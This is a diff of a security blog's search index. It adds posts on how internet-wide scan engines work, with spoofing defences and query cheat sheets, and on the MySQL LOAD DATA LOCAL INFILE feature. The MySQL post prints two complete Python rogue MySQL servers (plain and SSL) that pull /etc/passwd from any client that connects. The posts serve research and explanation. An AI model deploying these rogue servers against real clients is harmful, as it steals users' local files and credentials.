@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[socks-protocol-analysis]]></title>
+    <url>%2Fblog%2Fsocks-protocol-analysis%2F</url>
+    <content type="text"></content>
+  </entry>
+  <entry>
     <title><![CDATA[spoof-defense]]></title>
     <url>%2Fblog%2Fspoof-defense%2F</url>
     <content type="text"></content>
@@ -46,16 +51,6 @@
     <content type="text"></content>
   </entry>
   <entry>
-    <title><![CDATA[mysql_load_local_data]]></title>
-    <url>%2Fblog%2Fmysql-load-local-data%2F</url>
-    <content type="text"></content>
-  </entry>
-  <entry>
-    <title><![CDATA[gitlab_djvu_rce]]></title>
-    <url>%2Fblog%2Fgitlab-djvu-rce%2F</url>
-    <content type="text"></content>
-  </entry>
-  <entry>
     <title><![CDATA[空间搜索引擎与端口扫描欺骗]]></title>
     <url>%2Fblog%2Fsome-analysis-of-the-Internet-spatial-search-engine%2F</url>
     <content type="text"><![CDATA[在整个ATT&amp;CK的链路中，资产扫描探测的结果对于最终的渗透效果有着重要的影响，对目标资产了解的越多，更容易分析出组织架构、脆弱点和突破点。为了减少扫描行为被防守队发现或封禁，Shodan, Fofa, Zoomeye等空间搜索引擎作为第三方的资产收录平台可以很好的辅助我们，免去扫描的步骤，直接搜索利用点。尤其是在攻防演练或者hw等时期，大量的蜜罐部署以及7*24小时的防守值班，任何轻微的可疑扫描行为都会引起防守队的察觉，从而被封IP。因此利用好第三方搜索引擎的结果，可以让我们更加容易和灵活的进行边界突破。本文将介绍空间搜索引擎的原理及一些常见特性，以及可能的对抗方式——扫描欺骗。 首先第一个问题，这些搜索引擎的作用是什么？根据个人经验，我将其划分为以下4类。 资产发现与统计 基于版本、banner的漏洞利用 脆弱性信息发现 (包括弱口令、回显包含hacked by xx) 0day漏洞影响评估 在本篇文章中，我们主要关注与原理层面的内容并尝试通过各种方式验证我们的猜测。除此之外，一些常用的用法及特性放在了附录中，可以作为清单进行查询。 端口扫描首先是第一阶段，端口扫描。大多数搜索引擎都会声称他们的产品扫描全网整个IPv4的地址空间并进行识别收录，根据我的实际测试结果，在公网服务器上部署任意一个服务，基本上这些引擎的数据库都会在1天之内进行收录，效率还是蛮高的。那么，他们是如果对整个IPv4空间进行扫描的？根据一些公开的分享和业界对于端口扫描的常见方式，基于无状态扫描的高效性，基本可以确定这些搜索引擎也是使用类似zmap,masscan这样的工具进行端口开放性探测，之后在第一步的基础上，利用nmap等工具进行服务的版本探测、指纹识别。 对于TCP的服务扫描，其原理基本分为两大类: 基于TCP三次握手机制 基于RFC规定实现的特性 使用第一类方式进行扫描是基于握手机制，客户端发送SYN包，服务端返回SYN+ACK包进行确认，常见的有SYN扫描(半连接扫描)、connect扫描、无状态扫描；第二类大多数是基于TFC的规定(当数据包中没有SYN/ACK/RST标志时，端口关闭的会导致服务器返回一个RST包，而被过滤或开放不会有任何回包)，例如常见的TCP window/ACK扫描，TCP Xmas/FIN/null/Maimon 扫描。第二类的扫描机制无法有效确认出端口是否开放，所以在全网量级的扫描活动中并不常见，大部分还是基于第一类的三次握手原理进行。 Zmap and masscan are well-known port scanning tools, which claim to scan the entire network ports within 45 minutes. The reason why the speed is so fast is that it uses a stateless scanning method.As you know, the theoretical basis of port scanning is that the server returns different data for TCP packets with different flags.The client sends an SYN packet with the special seq number value. After receiving this packet, the opened server responds to the SYN+ACK packet and sets the ack number to seq+1. In the end, the client responds to an ACK packet to complete the connection establishment. This process is also the familiar TCP Three-way Handshake.Note here that the value of the ack field in the response data packet response by the server can be predicted, so the process of sending SYN packet and receiving SYN+ACK packet can be separated by two programs to improve the efficiency of the scanning, and we could set a special sequence number value to indicate different scanned targets.The figure below is the implementation in masscan. 为了验证我们的猜测，我们在公有云部署了一些蜜罐来尝试捕获这些扫描的行为。在蜜罐上开放了TOP 1000的端口并剔除掉80,443,3306等极其常见的端口，剔除的目的是为了减少蠕虫、批量化攻击脚本等行为对我们带来的干扰。除了被动的等待搜索引擎对我们的探测之外，我们还利用shodan提供的主动扫描能力 Shodan On-demand Scaning主动发起探测. 根据扫描的结果，我们发现了一些有意思的东西。首先我们来看看主动扫描的结果。(我不知道为什么会一直显示这个信息，及时去扫描新的开放的端口) 在我们主动提交扫描任务后，我们在服务器上抓包结果如图所示。根据ip搜索的结果，我们基本可以确认64开头的ip属于Shodan.我们的服务器大概收到了总过500个包的样子，剔除掉banner扫描的结果，差不多只有300个包的样子。从扫描的结果来看，基本可以看出来shodan的扫描方式是类似zmap、masscan这样的无状态扫描方式——使用syn包扫描判断端口开放与否。不同的是，在shodan扫描包的填充字段，ip_id 和 window_size都是随机值，而zmap的ip_id是54321, window_size是 65535。除此之外，可以看到，在主动扫描任务重，对于不同端口的扫描使用的是同一ip源。这里顺便提一句，常见的扫描工具，nmap,zmap,masscan在包层面有一定特征: nmap: 默认 window_size:1024 zmap: 默认 window_size:65535 / ip_id:54321 masscan: 默认 window_size:1200 当确认某一端口确实是开放时，他将会利用一些探测策略来进行服务版本探测。可以看到，对于80端口也就是常见的HTTP服务，其会扫描主页、robots.txt、sitemap文档,icon图标等。值得注意的是，在版本探测的时候，window_size会被设置为固定值64240。 如图所示，是蜜罐捕获的被动扫描结果，扫描的字段和填充值和我们主动扫描的结果看起来差不多。不一样的是，并没有发现同一个ip扫描大量端口的行为，这也很容易理解，被动扫描为了不触发一些安全设备，通常都会将全网的扫描任务分布式的下发到不同的节点，并由不同的ip进行扫描任务，所以对特定的服务期而言，不会在短时间内收到来自同一个IP的大量扫描行为。我们将全端口进行了开放，一天下来，只有很少一部分端口有被扫到。 版本探测在版本探测阶段，Shodan和Nmap一样维护这一大批版本探测策略，根据公开的信息显示，其支持超过200种协议类型的探测。Shodan向不同端口发送不同类型的探测包，然后根据服务端返回的信息内容进行解析，从而判断出目标服务端口运行的服务类型及版本。本文不再关心这些版本探测的策略，如果有兴趣可以去看各类服务探测的文章或者nmap手册。 在这里 plcscan.org, 你可以看到他们列举了shodan最为常见使用的协议，包括很多工控协议。 一些特性介绍完他们的基本扫描原理，这里我们介绍几个比较有意思的字段。 ASN当你需要评估的网络达到一定的规模时，基于IP和IP段的搜索方式显然无法有效的帮助我们来进行识别和评估。这时也许 ASN 字段可以帮你快速评估整个组织的设备情况。 An autonomous system (AS) is a collection of connected Internet Protocol (IP) routing prefixes under the control of one or more network operators on behalf of a single administrative entity or domain that presents a common, clearly defined routing policy to the Internet. A regional Internet registry (RIR) is an organization that manages the allocation and registration of Internet number resources within a region of the world. Internet number resources include IP addresses and autonomous system (AS)) numbers. 你可以简单的理解为5个区域互联网注册管理机构管理着整个世界的IP地址空间。当有资格的组织或企业想要申请管理部分公网IP时，向所属地区的注册管理机构进行申请，申请成功后便会获取特定IP网段的所有权并有权决定这些网段如何进行内部分配及使用。这些IP段构成了一个自治系统，其编号被称为asn编号。 当属于不同asn系统的IP需要进行通信时，往往会通过最短的链路进行数据通信，这也就是我们熟悉的BGP协议所做的工作了。举个例子，在天朝，移动、联通、电信可以看成三个不同的ASN网络，他们内部的节点互联的速度很快，而互访的体验就会很差，这也就是我们经常会听见BGP线路加速的原因。 通常情况下，大型组织或企业所拥有的asn是有限的，和IP段的量级相比差很多，因此可以通过asn号快速方便的进行资产的搜索。这里推荐一个网站用于asn信息的查询, hackertarget. 假设我们今天需要对腾讯在公网的端口暴露情况进行分析，我们可以使用这个网站查询到所有归属于Tencent的asn号并使用搜索引擎进行搜索。 与 org, isp, ip 等字段对比, 通过asn 的方式获取数据显得更加的高效。但同样存在一个问题，一般大型的组织会对外提供服务，因此通过asn号获取的资产有可能是其客户的资产，这一点可能需要通过其他纬度来进行剔除。 hash在翻搜索引擎的手册中，你可以看到一个有意思的事情:所有引擎会去计算banner的哈希值、icon的哈希值甚至http包的哈希值，记为hash、 http.favicon.hash或者http.html.hash. 这个哈希值可以用来快速的筛选过滤出/排除具有相同内容特征的服务器，这里使用mmh3哈希算法来进行内容的哈希是从计算与存储的高效性方面来考虑的。 JARM目前越来越多的Web站点采用SSL/TLS的方式来保护通信中的数据安全不被第三方中间人进行嗅探，而由于TLS在握手阶段客户端和服务端会发送大量自己支持的加密算法套件、哈希方式、压缩方式并进行协商选择，这部分数据又是明文信息，而相同的服务、程序对于相同的请求选择偏好是固定的，因此这个规律也被用来生成TLS指纹，用来标识一类具有相同SSL/TLS属性配置的程序。对于SSL/TLS的协议分析在这里不再赘述，有兴趣的可以看我之前的TLS协议分析以及对于SSL/TLS指纹分析的内容。 JARM指纹也是如此，相比于JA3/JA3S，JARM是用来识别特定配置的TLS服务器。其原理是主动发送10个精心构造的TLS client握手包，根据服务端返回的结果进行指纹计算。通常相同配置的TLS服务器返回的指纹是一致的，因此可以用来快速的识别一些企业特定的服务器。这些精心构造的握手包包括是否支持TLS1.3,不同的密码学套件顺序如何选择，异常套件的处理方式等等 最终其会根据10个回复的server_hello数据包中的字段进行指纹计算，每次扫描取的内容为密码学套件|TLS版本|ALPN协议信息|扩展字段 JARM除了用于识别相同配置的TLS服务器，其也可以用于识别恶意服务器(如果恶意服务器是自行搭建的话)，如下图是官方给出的常见恶意server的JARM，如果你按照这个值去搜索引擎中搜索，你会发现有一大堆服务器，都是恶意的嘛？当然不是，其主要原因是像这些知名C2工具不会自己去实现一个中控web服务器，而是内置了特定版本的常见web服务器，例如没有记错的话，Metasploit使用nginx而Cobalt Strike使用tomcat，因此进行搜索时，会混入大量正常的服务器。 dig也是一个比较新的特性，同JARM的目的一样，也是为了去识别恶意的服务器，不同的是，dig是为了识别恶意的Cobalt Strike DNS服务器。如下图所示，为典型的带一个DNS Redirector``的恶意DNS服务器链路。使用Redirector的好处是即使被防守方发现通过DNS隧道进行通信导致ip被ban,也可以很轻松的通过域名解析的修改来进行服务器的切换，从而保住真实的DNS Listener不被发现。 那么如果去发现真实的DNS Listener呢？Cobalt Strike的DNS Listener有一个特性，即对于不关心的域名会选择忽略并返回一个固定的ip值，这个ip默认为0.0.0.0,这一点可以从其代码中看出 而当符合请求的域名包含特定的前缀时，CS会返回shellcode: 因此，如果DNS Listener的端口暴露在公网可访问，通过解析不同域名，如果返回值相同或均为0.0.0.0,则很有可能是cobalt strike的真实DNS服务器. 端口扫描欺骗我们现在来换个角度。如果你是大型组织的负责人，这些搜索引擎对于的价值是什么？可能很大概率你并不想让第三方平台对你公网暴露的资产进行收录，因为这样攻击者会更加容易的进行入口突破。当然最简单的方式是关闭所有对外开放的端口，但这也显然不太现实。因此，端口扫描欺骗也许是有效缓解并增加攻击者成本的有效方式之一。通过端口欺骗技术，可以向攻击者的扫描结果数据库或搜索引擎的数据库中插入大量无效的开放信息甚至banner信息，从而干扰并浪费攻击者的精力与资源. 根据我们之前提到的内容，端口扫描的逻辑是根据三次握手的回包数据来判断是否端口开放的。当一个端口关闭时，系统会回复一个reset包作为响应。如果我们根据客户端的请求构造一个syn+ack包并比服务端真实发送的reset更快返回给客户端，客户端就会认为这个端口是开放的，而忽略掉真实服务器发送来的那个reset包。 我们来验证下我们的想法，我们在公网环境下部署了一套欺骗程序。程序主要分为两部分， 使用iptables进行引流和流量监控syn包并返回对应的假的syn+ack 包.当然你也可以使用开源的程序(portspoof). 做完了这些，我们对我们部署的服务器使用nmap、zmap、masscan进行了一次端口扫描。如图所示，一切都都跟预想的一样，可以成功的欺骗客户端的结果。 欺骗完扫描工具，还剩下最后一个问题，是否对搜索引擎也有效呢？答案是肯定的，但是不同的引擎的收录策略会有一些不同，且会存在一些确定的特征。 附录(使用速查手册)Shodan 123456789Exampleport:22,80,8080,443 country:CN,JP -hash:-0ssl.version:tlsv1.3 HTTP -port:443port:80 country:CN http.title:"Apache2 Ubuntu Default Page"port:8080 country:CN http.title:"Apache Tomcat/" http.favicon.hash:-297069493 Fofa title=”beijing” header=”abc” body=”abc” domain=”qq.com” host=”.gov.cn” icp=”京ICP证030173号” js_name=”js/jquery.js” js_md5=”82ac3f14327a8b7ba49baa208d4eaa15” icon_hash=”-247388890” port=”443” ip=”1.1.1.1” ip=”220.181.111.1/24” status_code=”402” protocol=”https” city=”Hangzhou” region=”Zhejiang” country=”CN” cert=”google” cert.subject=”Oracle Corporation” cert.issuer=”DigiCert” cert.is_valid=true banner=users &amp;&amp; protocol=ftp is_fraud=false is_honeypot=false type=service os=windows server==”Microsoft-IIS/7.5” app=”Apache” after=”2017” &amp;&amp; before=”2017-10-01” asn=”19551” org=”Amazon.com, Inc.” base_protocol=”udp” is_ipv6=true is_domain=true ip_ports=”80,443” 或者 ports=”80,443” ip_country=”CN” ip_region=”Zhejiang” ip_city=”Hangzhou” ip_after=”2019-01-01” ip_before=”2019-01-01” port_size=”6” port_size_gt=”6” port_size_lt=”12” ip_ports=”80,161” 12title="powered by" &amp;&amp; title!="discuz"body="content=WordPress" || (header="X-Pingback" &amp;&amp; header="/xmlrpc.php" &amp;&amp; body="/wp-includes/") &amp;&amp; host="gov.cn"]]></content>
@@ -63,9 +58,36 @@
         <category>scanning</category>
       </categories>
       <tags>
-        <tag>network security</tag>
         <tag>Search-Engine</tag>
+        <tag>network security</tag>
         <tag>port spoofing</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Gitlab 13.10.2 Remote Code Execution()]]></title>
+    <url>%2Fblog%2Fgitlab-djvu-rce%2F</url>
+    <content type="text"></content>
+      <categories>
+        <category>scanning</category>
+      </categories>
+      <tags>
+        <tag>Search-Engine</tag>
+        <tag>network security</tag>
+        <tag>port spoofing</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[mysql本地文件任意读取分析/rogue-mysql(ssl)-server]]></title>
+    <url>%2Fblog%2Fmysql-load-local-data%2F</url>
+    <content type="text"><![CDATA[Mysql存在一个特性，即如果使用LOAD DATE LOCAL INFILE，便可以从连接到数据库的客户端读取一个本地文件并写入数据库指定数据表中。而在这个逻辑中，客户端真正传送哪个文件到数据表中是由服务端发送的数据字段决定的，因此这样的特性很容易构造出一个恶意的mysql服务器从而造成任意客户端连接此服务器之后的任意本地文件读取。 LOAD DATE LOCAL INFILE创建一个test表并配置好其字段，之后客户端连接mysql服务器，执行以下指令，可以看到/etc/passwd的内容已经被写入test表中。 1load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; 为了搞清具体发生了什么，我们通过抓包来详细分析一下mysql的协议内容。 协议分析高版本的mysql服务器会默认使用ssl加密进行连接，会对我们的抓包造成一定的麻烦，因此可以使用--ssl=disabled来临时取消ssl。根据抓包的结果可以看到，当完成三次握手后，服务端会主动发送greeting报文，内容包括协议、版本、thread id、salt以及服务端支持的配置字段。可以看到有一个字段Can Use LOAD DATA LOCAL表明服务器支持从本地读取文件进数据库。 第二个包则是客户端发起的login request,主要是客户端支持的一些配置属性，登陆用户名，本地系统、加密方式等信息，可以看到这里也有Can Use LOAD DATA LOCAL字段，表名服务器支持本地文件读取的方式。 之后便是登陆成功的服务端回显，状态为OK，在之后就是mysql客户端连接后默认会发送的服务版本信息获取，用于本地的banner显示。 登陆成功之后的数据包便是我们发送的query和服务的response内容，我们可以看到，当请求load local data时，服务端会返回一个response tabular报文，包含了要加载的本地文件路径，客户端根据这个路径获取数据然后进行传输。因此如果我们可以构造恶意的服务器，修改发送的文件名内容，是不是就可以读取本地的任意文件。 mysql evil server如上述提到的流程，我们可以构造一个恶意的mysql服务器，完成认证后，由于客户端默认会发送一个mysql版本查询，此时我们回复他一个请求本地数据的包，即可读取任意的本地文件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/local/bin/python# -*- coding:utf-8 -*-'''@author: empty_xl@contact: empty_xl@163.com'''import socketdef main(): filename = "/etc/passwd" server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind(('', 3306)) server.listen(2) conn, addr = server.accept() print('connect form: &#123;&#125;'.format(addr)) # send server_greeting conn.sendall("\x5b\x00\x00" + # len "\x00" + # packet num "\x0a" + # protocol "\x35\x2e\x37\x2e\x33\x35\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x38\x2e\x30\x34\x2e\x31\x00" + # version "\x04\x00\x00\x00" + # thread ID "\x6e\x7c\x48\x1b\x6a\x3f\x30\x72\x00" + # salt "\xff\xf7" + # server cap "\x08" + # server language "\x02\x00" + # server status "\xff\xc1" + # extended server cap "\x15" + # auth plugin "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + # unused "\x7b\x1d\x2a\x41\x63\x35\x3a\x3f\x3b\x07\x1a\x6b\x00" + #salt "\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00" # auth plugin ) clien_data = conn.recv(2222) print('client_data:&#123;&#125;'.format(clien_data)) conn.sendall("\x07\x00\x00" + # len "\x02" + # packet number "\x00" + # response code "\x00\x00\x02\x00\x00\x00") print("server OK packet") clien_data = conn.recv(2222) print('client_data:&#123;&#125;'.format(clien_data)) print("arbitrary file read --&gt; &#123;&#125;".format(filename)) file_payload = '\x0c' + "\x00\x00\x01\xFB" + filename conn.sendall(file_payload) clien_data = conn.recv(2222) print('----------\n&#123;&#125;'.format(clien_data)) conn.close()if __name__ == '__main__': main() mysql evil ssl server刚我们提到，mysql是支持ssl加密的且高版本默认会使用加密的方式，在我们之前的evil server中我们将switch to ssl after handshake设置为了0，即不使用加密。那么为了伪装的更像点，如何实现一个mysql evil ssl server?首先我们看下正常使用ssl连接的逻辑。如下图可以看到，依旧是服务端的greeting以及客户端的login request,之后开始进行TLS握手阶段进行数据加密。 因此如果我们需要实现一个恶意的支持ssl的mysql服务器，首先是ssl的密钥以及证书。mysql默认会生成一个自签名证书，在/var/lib/mysql/中,或者也可以在/etc/mysql/mysql.conf.d中修改ssl-cert等参数的内容。以下是我们实现的evil-ssl-rogue-mysql-server 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import socket, sslimport binasciidef main(): filename = "/etc/passwd" context = ssl.SSLContext(ssl.PROTOCOL_TLSv1) context.load_cert_chain(certfile="cert.pem", keyfile="key.pem") server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind(('0.0.0.0', 3306)) server.listen(5) conn, addr = server.accept() print('connect form: &#123;&#125;'.format(addr)) print('send mysql server greeting') # send server_greeting conn.sendall("\x5b\x00\x00" + # len "\x00" + # packet num "\x0a" + # protocol "\x35\x2e\x37\x2e\x33\x35\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x38\x2e\x30\x34\x2e\x31\x00" + # version "\x04\x00\x00\x00" + # thread ID "\x6e\x7c\x48\x1b\x6a\x3f\x30\x72\x00" + # salt "\xff\xff" + # server cap "\x08" + # server language "\x02\x00" + # server status "\xff\x80" + # extended server cap "\x15" + # auth plugin "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + # unused "\x7b\x1d\x2a\x41\x63\x35\x3a\x3f\x3b\x07\x1a\x6b\x00" + # salt "\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00" # auth plugin ) clien_data = conn.recv(4) print('Recv client data:&#123;&#125;'.format(clien_data)) data = clien_data[:3][::-1] len = int(binascii.hexlify(data),16) print('login record length: &#123;&#125;'.format(str(len))) clien_data = conn.recv(len) print('Recv client data:&#123;&#125;'.format(clien_data)) ssl_conn = context.wrap_socket(conn, server_side=True) print('finished ssl handshake') clien_data = ssl_conn.recv(2222) print('Recv ssl login data: &#123;&#125;'.format(clien_data)) print("auth okay") ssl_conn.sendall('\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00') clien_data = ssl_conn.recv(2222) print('First mysql query: &#123;&#125;'.format(clien_data)) print("request file") file_payload = "\x0c\x00\x00\x01\xFB" + filename ssl_conn.sendall(file_payload) clien_data = ssl_conn.recv(2222) print('filedata----------\n&#123;&#125;'.format(clien_data)) ssl_conn.shutdown(socket.SHUT_RDWR) ssl_conn.close() conn.close()if __name__ == '__main__': main()]]></content>
+      <categories>
+        <category>vulnerability analysis</category>
+      </categories>
+      <tags>
+        <tag>vulnerability analysis</tag>
+        <tag>mysql</tag>
+        <tag>arbitrary file read</tag>
+        <tag>protocol analysis</tag>
       </tags>
   </entry>
   <entry>
@@ -187,8 +209,8 @@
       </categories>
       <tags>
         <tag>network security</tag>
-        <tag>ssl/tls</tag>
         <tag>protocol analysis</tag>
+        <tag>ssl/tls</tag>
       </tags>
   </entry>
   <entry>
@@ -289,8 +311,8 @@
         <category>scanning</category>
       </categories>
       <tags>
-        <tag>scanning</tag>
         <tag>network security</tag>
+        <tag>scanning</tag>
       </tags>
   </entry>
   <entry>
